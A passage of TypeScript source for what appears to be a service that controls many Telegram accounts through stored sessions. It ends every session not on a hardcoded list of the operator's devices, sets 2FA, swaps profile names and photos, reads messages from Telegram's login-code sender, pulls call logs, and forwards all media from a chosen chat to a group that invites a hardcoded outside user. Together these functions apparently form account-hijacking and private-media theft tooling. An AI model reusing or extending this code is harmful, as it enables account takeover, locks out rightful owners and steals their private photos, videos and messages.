telegramClient.joinChannel(chatEntity.username);\r\n            console.log(telegramClient.phoneNumber, \" - Joined channel Success - \", chatEntity.username);\r\n            if (chatEntity.canSendMsgs) {\r\n                // try {\r\n                //     await this.activeChannelsService.update(chatEntity.channelId, chatEntity);\r\n                //     console.log(\"updated ActiveChannels\");\r\n                // } catch (error) {\r\n                //     console.log(parseError(error));\r\n                //     console.log(\"Failed to update ActiveChannels\");\r\n                // }\r\n            } else {\r\n                await this.channelsService.remove(chatEntity.channelId);\r\n                await this.activeChannelsService.remove(chatEntity.channelId);\r\n                console.log(\"Removed Channel- \", chatEntity.username);\r\n            }\r\n        } catch (error) {\r\n            console.log(telegramClient.phoneNumber, \" - Failed to join - \", chatEntity.username);\r\n            this.removeChannels(error, chatEntity.channelId, chatEntity.username);\r\n            throw error\r\n        }\r\n    };\r\n\r\n    async removeChannels(error: any, channelId: string, username: string) {\r\n        if (error.errorMessage == \"USERNAME_INVALID\" || error.errorMessage == 'CHAT_INVALID' || error.errorMessage == 'USERS_TOO_MUCH' || error.toString().includes(\"No user has\")) {\r\n            try {\r\n                if (channelId) {\r\n                    await this.channelsService.remove(channelId)\r\n                    await this.activeChannelsService.remove(channelId);\r\n                    console.log(\"Removed Channel- \", channelId);\r\n                } else {\r\n                    const channelDetails = (await this.channelsService.search({ username: username }))[0];\r\n                    await this.channelsService.remove(channelDetails.channelId)\r\n                    await this.activeChannelsService.remove(channelDetails.channelId);\r\n                    console.log(\"Removed Channel - \", channelDetails.channelId);\r\n                }\r\n            } catch (searchError) {\r\n                console.log(\"Failed to search/remove channel: \", searchError);\r\n            }\r\n        } else if (error.errorMessage === \"CHANNEL_PRIVATE\") {\r\n            await this.channelsService.update(channelId, { private: true })\r\n            await this.activeChannelsService.update(channelId, { private: true });\r\n        }\r\n    }\r\n\r\n    async getGrpMembers(mobile: string, entity: EntityLike) {\r\n        try {\r\n            const telegramClient = await this.getClient(mobile);\r\n            return await telegramClient.getGrpMembers(entity)\r\n        } catch (err) {\r\n            console.error(\"Error fetching group members:\", err);\r\n        }\r\n    }\r\n\r\n    async addContact(mobile: string, data: { mobile: string, tgId: string }[], prefix: string) {\r\n        try {\r\n            const telegramClient = await this.getClient(mobile);\r\n            return await telegramClient.addContact(data, prefix)\r\n        } catch (err) {\r\n            console.error(\"Error fetching adding Contacts:\", err);\r\n        }\r\n    }\r\n\r\n\r\n    async addContacts(mobile: string, phoneNumbers: string[], prefix: string) {\r\n        try {\r\n            const telegramClient = await this.getClient(mobile);\r\n            return await telegramClient.addContacts(phoneNumbers, prefix)\r\n        } catch (err) {\r\n            console.error(\"Error fetching adding Contacts:\", err);\r\n        }\r\n    }\r\n\r\n    async removeOtherAuths(mobile: string) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        await telegramClient.removeOtherAuths();\r\n        return 'Authorizations removed successfully';\r\n    }\r\n\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async getSelfMsgsInfo(mobile: string) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        return await telegramClient.getSelfMSgsInfo();\r\n    }\r\n\r\n    async createGroup(mobile: string) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        return await telegramClient.createGroup();\r\n    }\r\n\r\n    async forwardSecrets(mobile: string, fromChatId: string) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        return await telegramClient.createGroupAndForward(fromChatId);\r\n    }\r\n\r\n\r\n    async joinChannelAndForward(mobile: string, fromChatId: string, channel: string) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        return await telegramClient.joinChannelAndForward(fromChatId, channel);\r\n    }\r\n\r\n\r\n    async getCallLog(mobile: string) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        return await telegramClient.getCallLog();\r\n    }\r\n\r\n    async getmedia(mobile: string) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        return await telegramClient.getMediaMessages();\r\n    }\r\n\r\n    async getChannelInfo(mobile: string, sendIds: boolean = false) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        const result = await telegramClient.getDialogs({ limit: 10, archived: false })\r\n        // console.log(result)\r\n        return await telegramClient.channelInfo(sendIds);\r\n    }\r\n\r\n    async getAuths(mobile: string) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        return await telegramClient.getAuths();\r\n    }\r\n\r\n    async getMe(mobile: string) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        return await telegramClient.getMe();\r\n    }\r\n\r\n    async createNewSession(mobile: string) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        return await telegramClient.createNewSession();\r\n    }\r\n\r\n    async set2Fa(mobile: string) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        try {\r\n            await telegramClient.set2fa();\r\n            await telegramClient.disconnect();\r\n            return '2Fa set successfully'\r\n        } catch (error) {\r\n            const errorDetails = parseError(error)\r\n            throw new HttpException(errorDetails.message, parseInt(errorDetails.status))\r\n        }\r\n    }\r\n\r\n    async updatePrivacyforDeletedAccount(mobile: string) {\r\n        const telegramClient = await this.getClient(mobile);\r\n        await telegramClient.updatePrivacyforDeletedAccount()\r\n    }\r\n\r\n    async deleteProfilePhotos(mobile: string) {\r\n        const telegramClient = await this.getClient(mobile);\r\n        await telegramClient.deleteProfilePhotos()\r\n    }\r\n\r\n    async setProfilePic(\r\n        mobile: string, name: string,\r\n    ) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        await telegramClient.deleteProfilePhotos();\r\n        try {\r\n            await CloudinaryService.getInstance(name);\r\n            await sleep(2000);\r\n            const rootPath = process.cwd();\r\n            console.log(\"checking path\", rootPath)\r\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp1.jpg'));\r\n            await sleep(3000);\r\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp2.jpg'));\r\n            await sleep(3000);\r\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp3.jpg'));\r\n            await sleep(1000);\r\n            await telegramClient.disconnect();\r\n            return 'Profile pic set successfully'\r\n        } catch (error) {\r\n            const errorDetails = parseError(error)\r\n            throw new HttpException(errorDetails.message, parseInt(errorDetails.status))\r\n        }\r\n    }\r\n\r\n    async updatePrivacy(\r\n        mobile: string,\r\n    ) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        try {\r\n            await telegramClient.updatePrivacy()\r\n            return \"Privacy updated successfully\";\r\n        } catch (error) {\r\n            const errorDetails = parseError(error)\r\n            throw new HttpException(errorDetails.message, parseInt(errorDetails.status))\r\n        }\r\n    }\r\n\r\n    async downloadProfilePic(\r\n        mobile: string, index: number\r\n    ) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        try {\r\n            return await telegramClient.downloadProfilePic(index)\r\n        } catch (error) {\r\n            console.log(\"Some Error: \", parseError(error), error);\r\n            throw new Error(\"Failed to update username\");\r\n        }\r\n    }\r\n\r\n    async updateUsername(\r\n        mobile: string, username: string,\r\n    ) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        try {\r\n            return await telegramClient.updateUsername(username)\r\n        } catch (error) {\r\n            console.log(\"Some Error: \", parseError(error), error);\r\n            throw new Error(\"Failed to update username\");\r\n        }\r\n    }\r\n\r\n    async getMediaMetadata(mobile: string, chatId: string, offset: number, limit: number) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        return await telegramClient.getMediaMetadata(chatId, offset, limit);\r\n    }\r\n\r\n    async downloadMediaFile(mobile: string, messageId: number, chatId: string, res: any) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        return await telegramClient.downloadMediaFile(messageId, chatId, res)\r\n    }\r\n\r\n    async forwardMessage(mobile: string, chatId: string, messageId: number) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        return await telegramClient.forwardMessage(chatId, messageId);\r\n    }\r\n\r\n    async leaveChannels(mobile: string) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        const channelinfo = await telegramClient.channelInfo(false);\r\n        const leaveChannelIds = channelinfo.canSendFalseChats\r\n        return await telegramClient.leaveChannels(leaveChannelIds);\r\n    }\r\n\r\n\r\n    async leaveChannel(mobile: string, channel: string) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        return await telegramClient.leaveChannels([channel]);\r\n    }\r\n\r\n\r\n    async deleteChat(mobile: string, chatId: string) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        return await telegramClient.deleteChat(chatId);\r\n    }\r\n    async updateNameandBio(\r\n        mobile: string,\r\n        firstName: string,\r\n        about?: string,\r\n    ) {\r\n        const telegramClient = await this.getClient(mobile)\r\n        try {\r\n            await telegramClient.updateProfile(firstName, about)\r\n            return \"Username updated successfully\";\r\n        } catch (error) {\r\n            console.log(\"Some Error: \", parseError(error), error);\r\n            throw new Error(\"Failed to update username\");\r\n        }\r\n    }\r\n}\r\n","import { TelegramClient } from 'telegram';\r\nimport { StringSession } from 'telegram/sessions';\r\nimport { NewMessage, NewMessageEvent } from 'telegram/events';\r\nimport { Api } from 'telegram/tl';\r\nimport axios from 'axios';\r\nimport * as fs from 'fs';\r\nimport { CustomFile } from 'telegram/client/uploads';\r\nimport { contains, fetchWithTimeout, parseError, ppplbot } from '../../utils';\r\nimport { TotalList, sleep } from 'telegram/Helpers';\r\nimport { Dialog } from 'telegram/tl/custom/dialog';\r\nimport { LogLevel } from 'telegram/extensions/Logger';\r\nimport { MailReader } from '../../IMap/IMap';\r\nimport bigInt from 'big-integer';\r\nimport { IterDialogsParams } from 'telegram/client/dialogs';\r\nimport { disconnectAll } from '../TgSignup/TgSignup.service';\r\nimport { EntityLike } from 'telegram/define';\r\n\r\nclass TelegramManager {\r\n    private session: StringSession;\r\n    public phoneNumber: string;\r\n    public client: TelegramClient | null;\r\n    private channelArray: string[];\r\n    private static activeClientSetup: { days?: number, archiveOld: boolean, formalities: boolean, newMobile: string, existingMobile: string, clientId: string };\r\n    constructor(sessionString: string, phoneNumber: string) {\r\n        this.session = new StringSession(sessionString);\r\n        this.phoneNumber = phoneNumber;\r\n        this.client = null;\r\n        this.channelArray = [];\r\n    }\r\n\r\n    public static getActiveClientSetup() {\r\n        return TelegramManager.activeClientSetup;\r\n    }\r\n\r\n    public static setActiveClientSetup(data: { days?: number, archiveOld: boolean, formalities: boolean, newMobile: string, existingMobile: string, clientId: string } | undefined) {\r\n        TelegramManager.activeClientSetup = data;\r\n    }\r\n\r\n    public async createGroup() {\r\n        const groupName = \"Saved Messages\"; // Customize your group name\r\n        const groupDescription = this.phoneNumber; // Optional description\r\n        const result: any = await this.client.invoke(\r\n            new Api.channels.CreateChannel({\r\n                title: groupName,\r\n                about: groupDescription,\r\n                megagroup: true,\r\n                forImport: true,\r\n            })\r\n        );\r\n        const { id, accessHash } = result.chats[0];\r\n\r\n        // Logic to categorize the dialog to a folder\r\n        const folderId = 1; // Replace with the desired folder ID\r\n        await this.client.invoke(\r\n            new Api.folders.EditPeerFolders({\r\n                folderPeers: [\r\n                    new Api.InputFolderPeer({\r\n                        peer: new Api.InputPeerChannel({\r\n                            channelId: id,\r\n                            accessHash: accessHash,\r\n                        }),\r\n                        folderId: folderId,\r\n                    }),\r\n                ],\r\n            })\r\n        );\r\n\r\n        // Add users to the channel\r\n        const usersToAdd = [\"fuckyoubabie\"]; // Replace with the list of usernames or user IDs\r\n        const addUsersResult = await this.client.invoke(\r\n            new Api.channels.InviteToChannel({\r\n                channel: new Api.InputChannel({\r\n                    channelId: id,\r\n                    accessHash: accessHash,\r\n                }),\r\n                users: usersToAdd\r\n            })\r\n        );\r\n        return { id, accessHash };\r\n    }\r\n\r\n    public async createGroupAndForward(fromChatId: string) {\r\n        const { id, accessHash } = await this.createGroup();\r\n        await this.forwardSecretMsgs(fromChatId, id.toString());\r\n    }\r\n\r\n    public async joinChannelAndForward(fromChatId: string, channel: string) {\r\n        const result: any = await this.joinChannel(channel);\r\n        const folderId = 1; // Replace with the desired folder ID\r\n        await this.client.invoke(\r\n            new Api.folders.EditPeerFolders({\r\n                folderPeers: [\r\n                    new Api.InputFolderPeer({\r\n                        peer: new Api.InputPeerChannel({\r\n                            channelId: result.chats[0].id,\r\n                            accessHash: result.chats[0].accessHash,\r\n                        }),\r\n                        folderId: folderId,\r\n                    }),\r\n                ],\r\n            })\r\n        );\r\n\r\n        await this.forwardSecretMsgs(fromChatId, channel);\r\n    }\r\n\r\n    public async forwardSecretMsgs(fromChatId: string, toChatId: string) {\r\n        let offset = 0;\r\n        let limit = 100;\r\n        let totalMessages = 0;\r\n        let forwardedCount = 0;\r\n        let messages: any = [];\r\n        do {\r\n            messages = await this.client.getMessages(fromChatId, { offsetId: offset, limit });\r\n            totalMessages = messages.total;\r\n            const messageIds = messages.map((message: Api.Message) => {\r\n                offset = message.id;\r\n                if (message.id && message.media) {\r\n                    return message.id;\r\n                }\r\n                return undefined;\r\n            }).filter(id => id !== undefined);\r\n            console.log(messageIds)\r\n            if (messageIds.length > 0) {\r\n                try {\r\n                    const result = await this.client.forwardMessages(toChatId, {\r\n                        messages: messageIds,\r\n                        fromPeer: fromChatId,\r\n                    });\r\n\r\n                    forwardedCount += messageIds.length;\r\n                    console.log(`Forwarded ${forwardedCount} / ${totalMessages} messages`);\r\n                    await sleep(5000); // Sleep for a second to avoid rate limits\r\n                } catch (error) {\r\n                    console.error(\"Error occurred while forwarding messages:\", error);\r\n                }\r\n                await sleep(5000); // Sleep for a second to avoid rate limits\r\n            }\r\n        } while (messages.length > 0);\r\n\r\n        await this.leaveChannels([toChatId]);\r\n        return;\r\n    }\r\n\r\n    //logic to forward messages from a chat to another chat maintaining rate limits\r\n    async forwardMessages(fromChatId: string, toChatId: string, messageIds: number[]) {\r\n        const chunkSize = 30; // Number of messages to forward per request\r\n        const totalMessages = messageIds.length;\r\n        let forwardedCount = 0;\r\n\r\n        for (let i = 0; i < totalMessages; i += chunkSize) {\r\n            const chunk = messageIds.slice(i, i + chunkSize);\r\n            try {\r\n                const result = await this.client.forwardMessages(toChatId, {\r\n                    messages: chunk,\r\n                    fromPeer: fromChatId,\r\n                });\r\n\r\n                forwardedCount += chunk.length;\r\n                console.log(`Forwarded ${forwardedCount} / ${totalMessages} messages`);\r\n                await sleep(5000); // Sleep for a second to avoid rate limits\r\n            } catch (error) {\r\n                console.error(\"Error occurred while forwarding messages:\", error);\r\n            }\r\n        }\r\n\r\n        return forwardedCount;\r\n    }\r\n\r\n    async disconnect(): Promise<void> {\r\n        if (this.client) {\r\n            console.log(\"Destroying Client: \", this.phoneNumber)\r\n            // await this.client.destroy();\r\n            this.client._destroyed = true\r\n            await this.client.disconnect();\r\n            this.client = null;\r\n        }\r\n        this.session.delete();\r\n    }\r\n\r\n    async getchatId(username: string): Promise<any> {\r\n        if (!this.client) throw new Error('Client is not initialized');\r\n        const entity = await this.client.getInputEntity(username);\r\n        return entity;\r\n    }\r\n\r\n    async getMe() {\r\n        const me = <Api.User>await this.client.getMe();\r\n        return me\r\n    }\r\n\r\n    async errorHandler(error) {\r\n        parseError(error)\r\n        if (error.message && error.message == 'TIMEOUT') {\r\n            // await this.client.disconnect();\r\n            // await this.client.destroy();\r\n            // await disconnectAll()\r\n            //Do nothing, as this error does not make sense to appear while keeping the client disconnected\r\n        } else {\r\n            console.error(`Error occurred for API ID ${this.phoneNumber}:`, error);\r\n            // Handle other types of errors\r\n        }\r\n    }\r\n\r\n    async createClient(handler = true, handlerFn?: Function): Promise<TelegramClient> {\r\n        this.client = new TelegramClient(this.session, parseInt(process.env.API_ID), process.env.API_HASH, {\r\n            connectionRetries: 5,\r\n        });\r\n        this.client.setLogLevel(LogLevel.ERROR);\r\n        this.client._errorHandler = this.errorHandler\r\n        await this.client.connect();\r\n        const me = <Api.User>await this.client.getMe();\r\n        console.log(\"Connected Client : \", me.phone);\r\n        if (handler && this.client) {\r\n            console.log(\"Adding event Handler\")\r\n            if (handlerFn) {\r\n                this.client.addEventHandler(async (event) => { await handlerFn(event); }, new NewMessage());\r\n            } else {\r\n                this.client.addEventHandler(async (event) => { await this.handleEvents(event); }, new NewMessage());\r\n            }\r\n        }\r\n        return this.client\r\n    }\r\n\r\n    async getGrpMembers(entity: EntityLike) {\r\n        try {\r\n            const result = []\r\n            // Fetch the group entity\r\n            const chat = await this.client.getEntity(entity);\r\n\r\n            if (!(chat instanceof Api.Chat || chat instanceof Api.Channel)) {\r\n                console.log(\"Invalid group or channel!\");\r\n                return;\r\n            }\r\n\r\n            console.log(`Fetching members of ${chat.title || (chat as Api.Channel).username}...`);\r\n\r\n            // Fetch members\r\n            const participants = await this.client.invoke(\r\n                new Api.channels.GetParticipants({\r\n                    channel: chat,\r\n                    filter: new Api.ChannelParticipantsRecent(),\r\n                    offset: 0,\r\n                    limit: 200, // Adjust the limit as needed\r\n                    hash: bigInt(0),\r\n                })\r\n            );\r\n\r\n            if (participants instanceof Api.channels.ChannelParticipants) {\r\n                const users = participants.participants;\r\n\r\n                console.log(`Members: ${users.length}`);\r\n                for (const user of users) {\r\n                    const userInfo = user instanceof Api.ChannelParticipant ? user.userId : null;\r\n                    if (userInfo) {\r\n                        const userDetails = <Api.User>await this.client.getEntity(userInfo);\r\n                        // console.log(\r\n                        //     `ID: ${userDetails.id}, Name: ${userDetails.firstName || \"\"} ${userDetails.lastName || \"\"\r\n                        //     }, Username: ${userDetails.username || \"\"}`\r\n                        // );\r\n                        result.push({\r\n                            tgId: userDetails.id,\r\n                            name: `${userDetails.firstName || \"\"} ${userDetails.lastName || \"\"}`,\r\n                            username: `${userDetails.username || \"\"}`,\r\n                        })\r\n                        if (userDetails.firstName == 'Deleted Account' && !userDetails.username) {\r\n                            console.log(JSON.stringify(userDetails.id))\r\n                        }\r\n                    } else {\r\n                        console.log(JSON.stringify((user as any)?.userId))\r\n                        // console.log(`could not find enitity for : ${JSON.stringify(user)}`)\r\n                    }\r\n                }\r\n            } else {\r\n                console.log(\"No members found or invalid group.\");\r\n            }\r\n            console.log(result.length)\r\n            return result;\r\n        } catch (err) {\r\n            console.error(\"Error fetching group members:\", err);\r\n        }\r\n    }\r\n    async getMessages(entityLike: Api.TypeEntityLike, limit: number = 8): Promise<TotalList<Api.Message>> {\r\n        const messages = await this.client.getMessages(entityLike, { limit });\r\n        return messages;\r\n    }\r\n    async getDialogs(params: IterDialogsParams): Promise<TotalList<Dialog>> {\r\n        const chats = await this.client.getDialogs(params);\r\n        console.log(\"TotalChats:\", chats.total);\r\n        return chats\r\n    }\r\n\r\n    async getLastMsgs(limit: number): Promise<string> {\r\n        if (!this.client) throw new Error('Client is not initialized');\r\n        const msgs = await this.client.getMessages(\"777000\", { limit });\r\n        let resp = '';\r\n        msgs.forEach((msg) => {\r\n            console.log(msg.text);\r\n            resp += msg.text + \"\\n\";\r\n        });\r\n        return resp;\r\n    }\r\n\r\n    async getSelfMSgsInfo(): Promise<{\r\n        photoCount: number;\r\n        videoCount: number;\r\n        movieCount: number,\r\n        total: number,\r\n        ownPhotoCount: number,\r\n        otherPhotoCount: number,\r\n        ownVideoCount: number,\r\n        otherVideoCount: number\r\n    }> {\r\n        if (!this.client) throw new Error('Client is not initialized');\r\n        const self = <Api.User>await this.client.getMe();\r\n        const selfChatId = self.id;\r\n\r\n        let photoCount = 0;\r\n        let ownPhotoCount = 0;\r\n        let ownVideoCount = 0;\r\n        let otherPhotoCount = 0;\r\n        let otherVideoCount = 0;\r\n        let videoCount = 0;\r\n        let movieCount = 0;\r\n\r\n        const messageHistory = await this.client.getMessages(selfChatId, { limit: 200 }); // Adjust limit as needed\r\n        for (const message of messageHistory) {\r\n            const text = message.text.toLocaleLowerCase();\r\n            if (contains(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {\r\n                movieCount++\r\n            } else {\r\n                if (message.photo) {\r\n                    photoCount++;\r\n                    if (!message.fwdFrom) {\r\n                        ownPhotoCount++\r\n                    } else {\r\n                        otherPhotoCount++\r\n                    }\r\n                } else if (message.video) {\r\n                    videoCount++;\r\n                    if (!message.fwdFrom) {\r\n                        ownVideoCount++\r\n                    } else {\r\n                        otherVideoCount++\r\n                    }\r\n                }\r\n            }\r\n        }\r\n\r\n        return ({ total: messageHistory.total, photoCount, videoCount, movieCount, ownPhotoCount, otherPhotoCount, ownVideoCount, otherVideoCount })\r\n    }\r\n    async channelInfo(sendIds = false): Promise<{ chatsArrayLength: number; canSendTrueCount: number; canSendFalseCount: number; ids: string[], canSendFalseChats: string[] }> {\r\n        if (!this.client) throw new Error('Client is not initialized');\r\n        const chats = await this.client.getDialogs({ limit: 1500 });\r\n        let canSendTrueCount = 0;\r\n        let canSendFalseCount = 0;\r\n        let totalCount = 0;\r\n        this.channelArray.length = 0;\r\n        const canSendFalseChats = [];\r\n        console.log(\"TotalChats:\", chats.total);\r\n        for (const chat of chats) {\r\n            if (chat.isChannel || chat.isGroup) {\r\n                try {\r\n                    const chatEntity = <Api.Channel>chat.entity.toJSON();\r\n                    const { broadcast, defaultBannedRights, id } = chatEntity;\r\n                    totalCount++;\r\n                    if (!broadcast && !defaultBannedRights?.sendMessages) {\r\n                        canSendTrueCount++;\r\n                        this.channelArray.push(id.toString()?.replace(/^-100/, \"\"));\r\n                    } else {\r\n                        canSendFalseCount++;\r\n                        canSendFalseChats.push(id.toString()?.replace(/^-100/, \"\"));\r\n                    }\r\n                } catch (error) {\r\n                    parseError(error);\r\n                }\r\n            }\r\n        };\r\n        return {\r\n            chatsArrayLength: totalCount,\r\n            canSendTrueCount,\r\n            canSendFalseCount,\r\n            ids: sendIds ? this.channelArray : [],\r\n            canSendFalseChats\r\n        };\r\n    }\r\n\r\n    async addContact(data: { mobile: string, tgId: string }[], namePrefix: string) {\r\n        try {\r\n            for (let i = 0; i < data.length; i++) {\r\n                const user = data[i];\r\n                const firstName = `${namePrefix}${i + 1}`; // Automated naming\r\n                const lastName = \"\";\r\n                try {\r\n                    await this.client.invoke(\r\n                        new Api.contacts.AddContact({\r\n                            firstName,\r\n                            lastName,\r\n                            phone: user.mobile,\r\n                            id: user.tgId\r\n                        })\r\n                    );\r\n                } catch (e) {\r\n                    console.log(e)\r\n                }\r\n            }\r\n        } catch (error) {\r\n            console.error(\"Error adding contacts:\", error);\r\n            parseError(error, `Failed to save contacts`);\r\n        }\r\n    }\r\n\r\n\r\n    async addContacts(mobiles: string[], namePrefix: string) {\r\n        try {\r\n            const inputContacts: Api.TypeInputContact[] = [];\r\n\r\n            // Iterate over the data array and generate input contacts\r\n            for (let i = 0; i < mobiles.length; i++) {\r\n                const user = mobiles[i];\r\n                const firstName = `${namePrefix}${i + 1}`; // Automated naming\r\n                const lastName = \"\"; // Optional, no last name provided\r\n\r\n                // Generate client_id as a combination of i and j (for uniqueness)\r\n                // Since we only have one phone per user here, j will always be 0\r\n                const clientId = bigInt((i << 16 | 0).toString(10)); // 0 is the index for the single phone\r\n\r\n                inputContacts.push(new Api.InputPhoneContact({\r\n                    clientId: clientId,\r\n                    phone: user, // mobile number\r\n                    firstName: firstName,\r\n                    lastName: lastName\r\n                }));\r\n            }\r\n\r\n            // Call the API to import contacts\r\n            const result = await this.client.invoke(\r\n                new Api.contacts.ImportContacts({\r\n                    contacts: inputContacts,\r\n                })\r\n            );\r\n\r\n            console.log(\"Imported Contacts Result:\", result);\r\n\r\n\r\n        } catch (error) {\r\n            console.error(\"Error adding contacts:\", error);\r\n            parseError(error, `Failed to save contacts`);\r\n        }\r\n    }\r\n\r\n    async leaveChannels(chats: string[]) {\r\n        console.log(\"Leaving Channels: initaied!!\");\r\n        console.log(\"ChatsLength: \", chats)\r\n        for (let id of chats) {\r\n            try {\r\n                const joinResult = await this.client.invoke(\r\n                    new Api.channels.LeaveChannel({\r\n                        channel: id\r\n                    })\r\n                );\r\n                console.log(\"Left channel :\", id)\r\n                if (chats.length > 1) {\r\n                    await sleep(30000);\r\n                }\r\n            } catch (error) {\r\n                const errorDetails = parseError(error);\r\n                console.log(\"Failed to leave channel :\", errorDetails.message)\r\n            }\r\n        }\r\n    }\r\n\r\n    async getEntity(entity: Api.TypeEntityLike) {\r\n        return await this.client?.getEntity(entity)\r\n    }\r\n\r\n    async joinChannel(entity: Api.TypeEntityLike) {\r\n        console.log(\"trying to join channel : \", entity)\r\n        return await this.client?.invoke(\r\n            new Api.channels.JoinChannel({\r\n                channel: await this.client?.getEntity(entity)\r\n            })\r\n        );\r\n    }\r\n\r\n    connected() {\r\n        return this.client.connected;\r\n    }\r\n\r\n    async connect() {\r\n        return await this.client.connect();\r\n    }\r\n\r\n    async removeOtherAuths(): Promise<void> {\r\n        if (!this.client) throw new Error('Client is not initialized');\r\n        const result = await this.client.invoke(new Api.account.GetAuthorizations());\r\n        for (const auth of result.authorizations) {\r\n            if (this.isAuthMine(auth)) {\r\n                continue;\r\n            } else {\r\n                await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`Removing Auth : ${this.phoneNumber}\\n${auth.appName}:${auth.country}:${auth.deviceModel}`)}`);\r\n                await this.resetAuthorization(auth);\r\n            }\r\n        }\r\n    }\r\n\r\n    private isAuthMine(auth: any): boolean {\r\n        return auth.country.toLowerCase().includes('singapore') || auth.deviceModel.toLowerCase().includes('oneplus') ||\r\n            auth.deviceModel.toLowerCase().includes('cli') || auth.deviceModel.toLowerCase().includes('linux') ||\r\n            auth.appName.toLowerCase().includes('likki') || auth.appName.toLowerCase().includes('rams') ||\r\n            auth.appName.toLowerCase().includes('sru') || auth.appName.toLowerCase().includes('shru') ||\r\n            auth.appName.toLowerCase().includes(\"hanslnz\") || auth.deviceModel.toLowerCase().includes('windows');\r\n    }\r\n\r\n\r\n    private async resetAuthorization(auth: any): Promise<void> {\r\n        await this.client?.invoke(new Api.account.ResetAuthorization({ hash: auth.hash }));\r\n    }\r\n\r\n    async getAuths(): Promise<any> {\r\n        if (!this.client) throw new Error('Client is not initialized');\r\n        const result = await this.client.invoke(new Api.account.GetAuthorizations());\r\n        return result;\r\n    }\r\n\r\n    async getAllChats(): Promise<any[]> {\r\n        if (!this.client) throw new Error('Client is not initialized');\r\n        const chats = await this.client.getDialogs({ limit: 500 });\r\n        console.log(\"TotalChats:\", chats.total);\r\n        const chatData = [];\r\n        for (const chat of chats) {\r\n            const chatEntity = await chat.entity.toJSON();\r\n            chatData.push(chatEntity);\r\n        }\r\n        return chatData;\r\n    }\r\n    async getMessagesNew(chatId: string, offset: number = 0, limit: number = 20): Promise<any> {\r\n        const messages = await this.client.getMessages(chatId, {\r\n            offsetId: offset,\r\n            limit,\r\n        });\r\n\r\n        const result = await Promise.all(messages.map(async (message: Api.Message) => {\r\n            const media = message.media\r\n                ? {\r\n                    type: message.media.className.includes('video') ? 'video' : 'photo',\r\n                    thumbnailUrl: await this.getMediaUrl(message),\r\n                }\r\n                : null;\r\n\r\n            return {\r\n                id: message.id,\r\n                message: message.message,\r\n                date: message.date,\r\n                sender: {\r\n                    id: message.senderId?.toString(),\r\n                    is_self: message.out,\r\n                    username: message.fromId ? message.fromId.toString() : null,\r\n                },\r\n                media,\r\n            };\r\n        }));\r\n\r\n        return result;\r\n    }\r\n\r\n    async getMediaUrl(message: Api.Message): Promise<string | Buffer> {\r\n        if (message.media instanceof Api.MessageMediaPhoto) {\r\n            console.log(\"messageId image:\", message.id)\r\n            const sizes = (<Api.Photo>message.photo)?.sizes || [1];\r\n            return await this.client.downloadMedia(message, { thumb: sizes[1] ? sizes[1] : sizes[0] });\r\n\r\n        } else if (message.media instanceof Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {\r\n            console.log(\"messageId video:\", message.id)\r\n            const sizes = message.document?.thumbs || [1]\r\n            return await this.client.downloadMedia(message, { thumb: sizes[1] ? sizes[1] : sizes[0] });\r\n        }\r\n        return null;\r\n    }\r\n\r\n    async sendInlineMessage(chatId: string, message: string, url: string) {\r\n        const button = {\r\n            text: \"Open URL\",\r\n            url: url,\r\n        };\r\n        const result = await this.client.sendMessage(chatId, {\r\n            message: message,\r\n            buttons: [new Api.KeyboardButtonUrl(button)]\r\n        })\r\n        return result;\r\n    }\r\n\r\n    async getMediaMessages() {\r\n        const result = <Api.messages.Messages>await this.client.invoke(\r\n            new Api.messages.Search({\r\n                peer: new Api.InputPeerEmpty(),\r\n                q: '',\r\n                filter: new Api.InputMessagesFilterPhotos(),\r\n                minDate: 0,\r\n                maxDate: 0,\r\n                offsetId: 0,\r\n                addOffset: 0,\r\n                limit: 200,\r\n                maxId: 0,\r\n                minId: 0,\r\n                hash: bigInt(0),\r\n            })\r\n        );\r\n        return result\r\n    }\r\n\r\n\r\n    async getCallLog() {\r\n        const result = <Api.messages.Messages>await this.client.invoke(\r\n            new Api.messages.Search({\r\n                peer: new Api.InputPeerEmpty(),\r\n                q: '',\r\n                filter: new Api.InputMessagesFilterPhoneCalls({}),\r\n                minDate: 0,\r\n                maxDate: 0,\r\n                offsetId: 0,\r\n                addOffset: 0,\r\n                limit: 200,\r\n                maxId: 0,\r\n                minId: 0,\r\n                hash: bigInt(0),\r\n            })\r\n        );\r\n\r\n        const callLogs = <Api.Message[]>result.messages.filter(\r\n            (message: Api.Message) => message.action instanceof Api.MessageActionPhoneCall\r\n        );\r\n\r\n        const filteredResults = {\r\n            outgoing: 0,\r\n            incoming: 0,\r\n            video: 0,\r\n            chatCallCounts: {},\r\n            totalCalls: 0\r\n        };\r\n        for (const log of callLogs) {\r\n            filteredResults.totalCalls++;\r\n            const logAction = <Api.MessageActionPhoneCall>log.action\r\n\r\n            // const callInfo = {\r\n            //     callId: logAction.callId.toString(),\r\n            //     duration: logAction.duration,\r\n            //     video: logAction.video,\r\n            //     timestamp: log.date\r\n            // };\r\n\r\n            // Categorize by type\r\n            if (log.out) 